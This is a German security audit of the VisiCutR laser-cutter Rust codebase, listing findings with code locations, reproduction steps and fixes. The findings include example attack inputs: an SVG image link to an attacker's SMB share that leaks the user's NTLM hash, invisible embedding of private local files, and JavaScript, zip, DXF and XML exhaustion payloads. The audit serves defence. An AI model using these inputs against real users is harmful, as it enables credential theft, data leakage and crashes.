# Audit VisiCutR 1.0.0-rc.2

Stand: 27.10.2026, Commit `c3deb58`. Geprüft wurde der Rust-Code in
`visicut-rust` (rund 44 000 Zeilen), die Abhängigkeiten, CI und die
Paketierung. Der Java-Quellbaum gehört nicht dazu. Das Audit hat am Code
nichts geändert.

Untersucht wurden fünf Bereiche:

- Netzwerk und Betriebssystem
- Datei-Importer
- LTT-Treiber und Lasersicherheit
- App-Logik und Oberfläche
- CI, Release und Abhängigkeiten

Jeder Fund wurde am Code nachverfolgt. Mit eigenen Probe-Testen bestätigt
sind die Gravur außerhalb des Betts, die Zip-Bombe und die beiden
JavaScript-Grenzen (Speicher und Laufzeit). Die übrigen Funde stützen sich
auf das Lesen des Codes.

## Stand der Behebung

Behoben auf dem Branch `claude/serene-planck-3r5kr0`, je Punkt ein Commit:

| Befund | Commit |
| --- | --- |
| H1 Gravur außerhalb des Betts (Y) | `905f7d1` |
| H2 Widerrufen nach „Öffnen“ | `194ff51` |
| H3 Verknüpfte Bilder, Netzwerkpfade | `f7a75d4` |
| M1 Durchgänge neuer Schritte | `b01ed60` |
| M2 Zip-Bomben | `95c23d8` |
| M3/M4 JavaScript (Speicher, Zeit) | `1a29327` |
| M5 PLF-Fristen, Ghostscript-Ausgabe (auch N10) | `1fa5cb6` |
| M6/M7 DXF-Blöcke und -Kurven | `d4e54d0` |
| M8 Tiefe Verschachtelung (betraf alle XML-Importe) | `927a0eb` |
| M9 PDF-Bomben | `f2d3b89` |
| Importe im UI-Thread | `202c76f` |
| M10 Kameraserver | `182a0db` |
| M12 Drehen bläht den Rahmen auf | `c84351f` |
| M13 Ungesicherte Bibliothek/Geräte beim Beenden | `8859b8a` |
| N1 ⌘R/Strg+R | `cc27542` |
| N8 Kamerapasswort, Rechte von `devices.json` (auch N9 für die Geräteliste) | `69d264d` |
| N5 0,01-%-Markierprofile | `7d6826e` |
| README im Hauptverzeichnis | `efe6d8b` |

Noch offen sind:

- M11 (Hover im Modus „Einzeln“)
- die übrigen Punkte unter „Bedienung und Daten“
- N2–N4, N6, N7, N9 (Materialbibliothek, Sitzung), N11–N15
- `cargo update` der TLS-Kette und die CI-Punkte

## Ergebnis in Kürze

| | |
| --- | --- |
| Tests | `cargo test --locked --all-targets`: 350 bestanden, 0 fehlgeschlagen, 3 ignoriert. Dazu gehört der Java-Paritätstest „byte for byte“. |
| Clippy / rustfmt | `cargo clippy --all-targets -D warnings` ohne Befund, `cargo fmt --check` sauber |
| `cargo audit` | 6 Schwachstellen in der TLS-Kette: `rustls` 0.23.45, `rustls-webpki` 0.103.15 und `webpki-roots` 1.0.9. Dazu 8 Warnungen (nicht mehr gepflegt, unsound, gelöscht) |
| Funde | 3 hoch, 13 mittel, 15 niedrig, dazu einige Doku-/CI-Punkte |

Der Code ist insgesamt sorgfältig gebaut:

- Werte werden vor dem Senden geprüft.
- Projekte werden atomar gespeichert.
- Lange Arbeiten laufen meist in eigenen Threads.
- Netzwerkzugriffe haben Grenzen.
- Die CI ist abgesichert: Actions per SHA gepinnt, minimale Rechte, keine
  Secrets in PR-Builds.

Die wichtigsten Lücken liegen an drei Stellen:

1. eine fehlende Y-Prüfung beim Gravieren,
2. der Widerrufen-Verlauf über das Öffnen eines anderen Projekts hinweg,
3. eingebettete Bilder, die beliebige lokale Dateien einlesen.

---

## Hoch

### H1 – Gravurzeilen außerhalb des Betts (Y) werden gesendet, Koordinate läuft über

**Ort:** `src/ltt/mod.rs`, und zwar `raster_code` (ab Z. 1313), `raster_pair`
(Z. 129–131), `Axis::bounding` (Z. 115–120) und die Kopfzeilen-Bounding-Box
(Z. 1115–1121).

**Fehler:** `raster_code` prüft beim Gravieren nur die X-Ränder („Gravur zu
nahe am Bettrand“), Y wird nicht geprüft.

- Die Rasterfläche stammt aus den Inhaltsgrenzen. Diese enthalten die halbe
  Linienstärke und auch Inhalt außerhalb der Zeichenfläche.
- `Project::fits_bed` prüft nur den Platzierungsrahmen.
- Negative Werte werden durch die Umwandlung `as u32` zu sehr großen Zahlen.

Ein Probe-Test bestätigt das. Ein gefülltes Rechteck von 20×10 mm mit
Linienstärke 2, unten bündig bei y = 590 mm, ergibt als letzte Zeile
Y = 4294967288 (−8 nach dem Überlauf). Bündig bei y = 0 liegen die Zeilen bei
Y bis 94640, das Maximum ist 94488.

Auf der Rotationsachse bricht derselbe Fall im Debug-Build mit „subtract with
overflow“ ab. Im Release-Build schreibt er stillschweigend eine falsche
Bounding-Box.

Java-VisiCut lehnt solche Aufträge ab: `sendCoordinate` und
`yPxToDeviceCoordinate` enthalten Assertions (`myAssert`).

**Auslöser:** Schon die Standard-Linienstärke von Inkscape (0,26 mm) reicht,
wenn ein Objekt bündig am Rand liegt.

**Behebung:**

- Jede Rasterzeile außerhalb von 0..Betthöhe ablehnen, auf der Rotationsachse
  jede negative Zeile.
- `as u32` in `raster_pair`, `header` und `Axis::bounding` durch
  `u32::try_from(..)` mit Fehlermeldung ersetzen.
- Regressionstests ergänzen: y = 0, y = 600 und Rotation.

### H2 – Widerrufen nach „Öffnen“ kann ein anderes Projekt überschreiben

**Ort:** `src/main.rs`, und zwar `checkpoint`, `restore` und `undo_last`
(Z. 1765–1793), `open_path` (Z. 1220–1277) und `struct Snapshot` (Z. 308).

**Fehler:** `undo` und `redo` werden beim Öffnen oder Neuanlegen nie geleert.
Ein `Snapshot` enthält das Projekt, aber nicht den `project_path`.

**Ablauf:**

1. `A.vcr` öffnen und ein Teil drehen.
2. `B.vcr` öffnen. A wird ohne Rückfrage in den Sitzungs-Cache gelegt.
3. ⌘Z drücken. Der Inhalt von A ist zurück, `project_path` zeigt aber auf
   `B.vcr`.
4. ⌘S drücken. `B.vcr` wird ohne Rückfrage mit dem Inhalt von A
   überschrieben.

**Behebung:** Beim Neuanlegen, Import und Projekt-Öffnen `undo` und `redo`
leeren. Alternativ `project_path` im `Snapshot` mitführen.

### H3 – Verknüpfte Bilder lesen beliebige lokale Dateien und betten sie ein (unter Windows auch per SMB)

**Ort:** `src/svg_import.rs` Z. 206–221 (`base_dir.join(path)`),
`file_url_path` (Z. 306–323) und `mime_type` (Z. 386).

**Fehler:** `href` und `sodipodi:absref` akzeptieren ohne Einschränkung:

- absolute Pfade,
- `../`,
- `file:///`,
- unter Windows `file://host/share` als UNC-Pfad.

Die Datei wird gelesen und als Base64 ins Projekt eingebettet.

**Szenarien:**

- **Windows:** Eine präparierte SVG, auch innerhalb einer PLF, wird per
  Doppelklick geöffnet. `path.is_file()` auf `\\angreifer\s\a.png` löst eine
  SMB-Anmeldung aus und sendet dabei den NTLM-Hash des Benutzers.
- **Alle Plattformen:** `<image width="0.01" href="/home/…/Ausweis.jpg"/>`
  oder ein beliebiges gzip-Archiv (`mime_type` hält 0x1F 0x8B für SVG) wird
  unsichtbar eingebettet. Wer das `.vcr`-Projekt später weitergibt, gibt die
  Datei mit.
- Dasselbe gilt für parametrische Vorlagen und für SVG-Teile in PLF-Dateien.

Der Satz im README „Webadressen werden nicht abgerufen“ deckt diese Fälle
nicht ab.

**Behebung:**

- Nur relative Pfade zulassen, die nach `canonicalize` unterhalb des
  SVG-Ordners bleiben. Sonst nachfragen.
- UNC-Pfade, `\\?\` und `file://` mit fremdem Host ablehnen.
- gzip nicht mehr pauschal als Bild durchlassen.

---

## Mittel

### Lasersicherheit und Auftragswerte

**M1 – Neuer Schritt erbt die Durchgänge des Motivs.**
Ort: `src/jobs_ui.rs:142`, `step.passes = project.passes`. Wird für das Motiv
„Schneiden, 3 Durchgänge“ ein Teil auf Gravieren gelegt und hat das
Gravurprofil nur einen Durchgang, wird trotzdem dreimal graviert. Nur
Profile mit mehreren Durchgängen überschreiben den Wert.
Behebung: `profile.map_or(1, |p| p.passes)`, oder die Durchgänge nur bei
gleichem Verfahren übernehmen.

### Robustheit gegen präparierte Dateien

Alle Importe laufen im UI-Thread: `open_path`, `drop_files`,
`add_files_as_parts`. Ein langer Import friert deshalb das Fenster ein, ein
Speicherüberlauf beendet den ganzen Prozess. Ungesicherte Arbeit geht dabei
verloren.

- **M2 – Zip-Bomben umgehen die Größenprüfung.**
  - Ort: `src/lab.rs:84`, `src/device.rs:480` und
    `src/import/plf/mappings.rs:708`.
  - Fehler: Geprüft wird `file.size()`, also die Größe, die die Zip-Datei
    selbst angibt. Danach liest `read_to_end` ohne Grenze. Ein Probe-Test mit
    zip 9.0.0 bestätigt das: Ein Eintrag gibt 100 B an und entpackt zu 20 MB.
  - Bei den FabLab-Einstellungen läuft das beim täglichen Abruf ohne Zutun.
    `last_check` wird nur bei Erfolg gesetzt, die App stürzt also bei jedem
    Start erneut ab. Voraussetzung ist ein kompromittierter Einstellungs-Server.
  - Behebung: `.take(MAX_ENTRY + 1)` wie in `plf.rs:72`, dazu eine Grenze für
    die Gesamtgröße.
- **M3 – JavaScript ohne Speichergrenze.**
  - Ort: `src/import/plf/script.rs`; betrifft `.ls`, `.psvg` und PLF-Teile.
  - `"a".repeat(2**30)` beendet die App mit „memory allocation … failed“,
    das ist im Probe-Test bestätigt.
- **M4 – JavaScript-Zeitlimit greift nicht in eingebauten Funktionen.**
  - `new Array(3e7).fill(1.5)` lief 10,6 s trotz 5 s Limit.
  - Ein Sortier-Vergleich mit innerer Schleife lief nach 60 s noch.
  - Der Worker wird nach `recv_timeout` aufgegeben und läuft mit 100 % CPU
    weiter. Solche Threads sammeln sich an.
  - Behebung für M3 und M4: Skripte in einem eigenen Prozess mit Speicher- und
    Zeitgrenze ausführen.
- **M5 – PLF vervielfacht die Grenzen.** Bis zu 1000 Einträge, jeder mit
  eigenen 5 s Skriptzeit oder 60 s Ghostscript, frieren die Oberfläche für
  Stunden ein. Behebung: eine Gesamtfrist pro Import und Import im
  Hintergrund mit Abbrechen.
- **M6 – Verschachtelte DXF-Blöcke.**
  - Ort: `src/import/dxf/convert.rs:666–730`.
  - Ein Block, der sich selbst per `INSERT` mit 1000×100 Feldern einfügt,
    bricht erst bei Tiefe 16 ab und gibt dort nichts aus. `MAX_PRIMITIVES`
    greift deshalb nie, der Import läuft praktisch endlos.
  - Behebung: ein globaler Zähler für besuchte INSERT-Instanzen.
- **M7 – DXF-Kurven ohne Segmentbudget.**
  - Ort: `dxf/geom.rs:270`. Ein SPLINE in einem großen INSERT-Feld kann
    mehrere GB an Segmenten erzeugen.
  - `write_svg` braucht O(Ebenen × Primitive) Schritte und ist bei vielen
    Ebenen extrem langsam.
- **M8 – Tiefe Verschachtelung in parametrischer SVG.**
  - Ort: `plf/parametric.rs:304/525`. Die Rekursion hat keine Tiefengrenze.
  - 100 000 verschachtelte `<g>` lassen den Stack überlaufen und beenden die
    App. Behebung: Tiefe > 1024 ablehnen.
- **M9 – PDF-Dekompressionsbombe.** `hayro` entpackt Flate-Datenströme ohne
  Grenze. `catch_unwind` fängt einen Speicherüberlauf nicht ab.

### Netzwerk

**M10 – Kameraserver `visicutr-cameraserver`.**
Ort: `src/bin/visicutr-cameraserver.rs`.

- Lauscht standardmäßig auf `0.0.0.0`, ohne Anmeldung, und bedient eine
  Anfrage nach der anderen.
- `read_line` wächst ohne Grenze.
- Es gibt kein Schreib-Timeout und keines für den Aufnahmebefehl.

Damit kann jeder im LAN den Speicher erschöpfen, den Server blockieren (ein
Byte alle 9 s) oder den Auslöser dauernd betätigen. Fehlerausgaben gehen an
unangemeldete Clients.

Behebung:

- `take(16 KiB)` für die Anfragezeile.
- Schreib-Timeout und eine Gesamtfrist pro Verbindung.
- Den Aufnahmebefehl nach einer Frist beenden.
- Optional Basic-Auth; der Client sendet sie bereits.

### Bedienung und Daten

- **M11 – Hover im Zuordnungsmodus „Einzeln“ friert ein.**
  - Ort: `geometry::object_outlines`, aufgerufen in `main.rs:3587`.
  - Für jedes Objekt wird die ganze SVG gefiltert, neu geparst und teils
    gerendert. Bei N Objekten sind das etwa O(N²) Schritte.
  - Ab etwa 1000 Pfaden (DXF/PDF) hängt das Fenster minutenlang.
- **M12 – Drehen um freie Winkel bläht den Motivrahmen auf.**
  - Ort: `compose.rs:385–437`. Der neue Rahmen wird aus dem alten Rahmen
    berechnet, nicht aus dem Inhalt.
  - Beispiel: +30° und dann −30° machen aus 300 mm einen Rahmen von 560 mm.
    Nach wenigen Drehungen gilt das Motiv als außerhalb des Betts, Senden ist
    dann gesperrt.
- **M13 – Ungesicherte Änderungen gehen beim Beenden verloren.**
  - Ort: Abfrage beim Beenden in `main.rs:4408` sowie die Entwürfe in
    `jobs_ui.rs:1982` und `devices_ui.rs:819`.
  - Entwürfe in Materialbibliothek und Geräteverwaltung zählen nicht als
    ungesichert. ⌘Q beendet ohne Rückfrage.
- **Weitere Punkte:**
  - Mehrere Dateien auf ein leeres Projekt ziehen und im
    Überlauf-Dialog „Alles importieren“ wählen: Nur die erste Datei kommt an
    (`main.rs:3982`).
  - Export und Senden bereiten den Auftrag synchron im UI-Thread vor
    (`main.rs:1860–1938`), obwohl die Vorschau dasselbe schon im Hintergrund
    erledigt.

---

## Niedrig

| # | Ort | Befund |
| --- | --- | --- |
| N1 | `main.rs:105` | ⌘R/Strg+R (Neu laden) steht im Menü, fehlt aber in `Command::KEYBOARD` und tut nichts. |
| N2 | `main.rs` (Ziehen, Griffe, X/Y/B/H, Zentrieren) | Diese Änderungen setzen keinen `checkpoint()`. ⌘Z nimmt sie zusammen mit dem vorherigen Schritt zurück. |
| N3 | `main.rs:1017` | `modal_open()` berücksichtigt `pending_import` nicht. Bei offenem Überlauf-Dialog wirken Entf, Kürzel und abgelegte Dateien weiter. |
| N4 | `jobs_ui.rs:1781` | ➕ erlaubt mehr als 64 Schritte. Das Projekt lässt sich dann nicht speichern, und die Sitzung lässt sich nicht wiederherstellen. |
| N5 | `resources/materials.json`, `ltt/mod.rs:665` | Die FAU-Profile „Papier 80g“ und „Thermopapier“ markieren mit 0,01 %. Sie werden als „Leistung ist 0 %“ abgelehnt, Java sendet 0,1 %. Das ist sicher, aber die Profile sind so unbrauchbar. |
| N6 | `jobs_ui.rs:262` | Bei einem Auftrag ohne Schritte (ganzes Motiv) wird von einem Profil mit mehreren Parametersätzen nur der erste verwendet. |
| N7 | `materials.rs:110–158` | `Library::validate` prüft Durchgänge und weitere Sätze nicht und erlaubt Geschwindigkeit < 0,1. Der Fehler zeigt sich erst beim Senden; es ist kein Sicherheitsproblem. Behebung: `ParameterSet::validate` mitverwenden. |
| N8 | `device.rs:59–63, 268–275` | Das Kamerapasswort steht im Klartext in `devices.json` (Rechte 0644). Der Kommentar zum macOS-Schlüsselbund ist veraltet, es gibt keinen Schlüsselbund-Code. |
| N9 | `device.rs:273`, `materials.rs:95`, `session.rs:142` | Gespeichert wird mit festem Namen `.tmp` und ohne `fsync`. Bei Stromausfall kann die Datei leer sein; dann gelten die FAU-Vorgaben und überschreiben beim nächsten Sichern die eigenen Geräte. Behebung: `workspace::write_atomic` verwenden. |
| N10 | `import/pdf/ghostscript.rs:54–80` | stderr und die Ausgabe-PDF werden ohne Grenze gelesen. Die Umwandlung blockiert die Oberfläche bis zu 60 s. |
| N11 | `import/pdf.rs:39–54` | Kann der eingebaute Interpreter eine EPS/PS nicht lesen, geht sie ohne Rückfrage an Ghostscript. `-dSAFER` ist gesetzt, aber es gab Umgehungen (CVE-2023-36664, CVE-2024-29510). |
| N12 | `compose.rs:864` | Eine weitergegebene `.vcr` kann über `source_file` beliebige lokale Dateien angeben, die „Neu laden“ dann einliest. |
| N13 | `resources/linux/install-desktop.sh:42` | `%` im Installationspfad wird in `Exec=` nicht zu `%%` verdoppelt. |
| N14 | `update.rs:94`, `main.rs:977` | `html_url` aus der GitHub-Antwort wird ungeprüft geöffnet. Besser nur `https://github.com/dbambus/VisiCutR/` zulassen. |
| N15 | `workspace.rs:234` u. a. | Das Dezimalkomma ist auch in der englischen, französischen, italienischen und niederländischen Oberfläche fest eingestellt. |

**Ungeprüft:** `resources/inkscape/visicutr_export.py:150` fügt
Element-IDs ungefiltert in `--actions` ein. Ein `;` in einer ID könnte
weitere Inkscape-Aktionen anhängen. Als einfache Härtung IDs auf
`[A-Za-z0-9_.:-]` beschränken.

---

## Abhängigkeiten, CI und Dokumentation

- **`cargo audit`:** `cargo update -p rustls -p rustls-webpki -p webpki-roots`
  behebt alle 6 Meldungen mit Patch-Versionen. TLS wird für die
  Update-Prüfung, die FabLab-Einstellungen und die Kamera verwendet.
  Nicht mehr gepflegt sind `paste`, `rustybuzz`, `ttf-parser`, `zbus_names`
  und `zvariant*`, alle über resvg/egui/rfd eingebunden. `tokio` 1.53.2 gilt
  als unsound, `clipboard-win` 5.4.1 ist gelöscht (yanked).
- **CI:** `cargo audit` oder `cargo deny` als Schritt ergänzen, damit solche
  Meldungen vor einem Release auffallen.
- **Toolchain:** `rust-toolchain.toml` nutzt das Profil „minimal“ ohne
  `components`. Lokal fehlt deshalb Clippy. Abhilfe:
  `components = ["clippy", "rustfmt"]`.
- **README im Hauptverzeichnis ist veraltet.** Dort steht „macOS Universal
  (Intel + Apple Silicon)“, `…-universal-apple-darwin.zip` und
  „AppKit/SwiftUI“. Tatsächlich baut die CI nur `aarch64-apple-darwin` mit
  der egui-Oberfläche (siehe `visicut-rust/README.md`).
- **`.travis.yml`** stammt aus dem Original-Projekt und enthält
  `wget --no-check-certificate`. Travis läuft nicht mehr, die Datei kann weg.
- **Windows-Programm** ist nicht Authenticode-signiert. SmartScreen warnt
  deshalb beim ersten Start.

---

## Geprüft und in Ordnung

- **Parameter:** Leistung, Geschwindigkeit, Durchgänge, Durchmesser, DPI,
  Zeilenversatz und Beschleunigung werden für Projekt, Schritte, Sätze und
  Teile auf endliche Werte und Bereiche geprüft. `ESC S/J/PE` werden wie in
  Java auf 1..1000 begrenzt.
- **Vektorkoordinaten:** Sie werden vor dem Kodieren auf 0..1000 × 0..600 mm
  geprüft.
- **Auftragsrahmen:** Prüfsumme, Länge, `BYE` und Byte-Reihenfolge stimmen
  mit Java überein (Paritätstest). Autorun ist aus.
- **Senden:** Alle Aufträge werden vor dem Verbinden vorbereitet. Es gibt
  keine automatische Wiederholung und damit keine doppelten Aufträge. Gerät
  und Host kommen aus der Geräteverwaltung, nicht aus der Projektdatei.
- **TLS:** ureq/rustls mit Zertifikatsprüfung. Alle Downloads haben
  Timeouts und Größengrenzen. Zugangsdaten werden bei Weiterleitungen nicht
  mitgeschickt.
- **Einzelinstanz:** Die Kommunikation läuft nur über `127.0.0.1` mit einem
  128-Bit-Token in einer Datei mit Rechten 0600. `--execute` öffnet nur die
  Sende-Bestätigung.
- **Ghostscript und Inkscape:** Beide werden ohne Shell mit Argumentliste
  aufgerufen, Ghostscript mit `-dSAFER` und 60-s-Frist.
- **Windows-Registry:** Nur `HKCU`, `"%1"` ist korrekt in Anführungszeichen.
- **PLF-Entpacken:** Ohne Pfad-Traversal, mit 1000 Einträgen, 25 MB pro
  Eintrag und 100 MB gesamt.
- **XML:** roxmltree mit Schutz gegen Billion Laughs. usvg löst keine
  externen Referenzen auf.
- **JavaScript-Sandbox:** Nur `move`, `line`, `echo` und `prompt`, kein
  Datei- oder Netzwerkzugriff.
- **EPS-Interpreter:** Begrenzt Schritte, Stack und Tiefe.
- **Speichern:** Projekt, Einstellungen und LTT-Export werden atomar
  geschrieben (`write_atomic` mit `sync_all`). Beim Export mehrerer Dateien
  fragt die App vor dem Überschreiben.
- **Übersetzungen:** Alle 987 Schlüssel sind in en/fr/it/nl vorhanden,
  Platzhalter stimmen überein.
- **CI:** Actions per Commit-SHA gepinnt, `persist-credentials: false`,
  `contents: read`. Es gibt nur `pull_request`, kein `pull_request_target`,
  Secrets erreichen also keine Fork-PRs. Der Cache wird nur auf `master`
  gespeichert.

## Testlücken

- Keine Tests für Gravur am oberen und unteren Bettrand, für Rotation mit
  Y < 0 und für den Überlauf der `as u32`-Umwandlungen (H1).
- Kein Java-Vergleich für Rotation, andere Auflösungen als 500 DPI und
  andere Schnittreihenfolgen als „Klassisch“. 3D-Gravur wird nur in der
  Kopfzeile verglichen.
- Keine Tests für die Durchgänge neuer Schritte (M1), Widerrufen nach dem
  Öffnen (H2) und den Pfadbereich verknüpfter Bilder (H3).

## Empfohlene Reihenfolge

1. H1 (Y-Prüfung und `try_from`), H2 (Verlauf leeren) und
   `cargo update` für rustls/webpki: klein, sofort umsetzbar.
2. M1 (Durchgänge), H3 (Bildpfade einschränken), M2 (`take` bei Zip), N1
   (Tastenkürzel ⌘R) und N9 (`write_atomic`).
3. Importe in einen Hintergrund-Thread mit Abbrechen verlegen und Skripte in
   einem eigenen Prozess ausführen (M3–M9). Danach den Kameraserver härten
   (M10).
